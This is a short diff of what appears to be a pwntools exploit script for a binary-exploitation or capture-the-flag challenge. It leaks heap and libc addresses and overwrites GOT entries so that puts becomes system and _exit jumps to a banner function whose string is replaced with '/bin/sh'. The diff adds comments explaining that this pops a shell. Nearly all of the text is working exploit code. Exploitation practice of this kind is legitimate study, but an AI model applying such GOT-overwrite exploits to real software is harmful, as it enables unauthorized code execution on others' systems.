@@ -70,6 +70,8 @@ destroy(1)
 heap_addr = u32(ask(1)[:4])
 libc_base = read_memory(elf.got["puts"]) - 0x067c10
 
+# The general idea is to cause the call of puts(banner) in the print_banner() function to be overwritten such that it will invoke system('bin/sh'), then to overwrite the _exit() function to print_banner().
+# This will cause a call to _exit() to instead pop a shell
 write_memory(elf.got["_exit"], p32(elf.symbols["print_banner"]))
 write_memory(elf.symbols["banner"], b"/bin/sh\x00")
 write_memory(elf.got["puts"], p32(libc_base + 0x03d250))
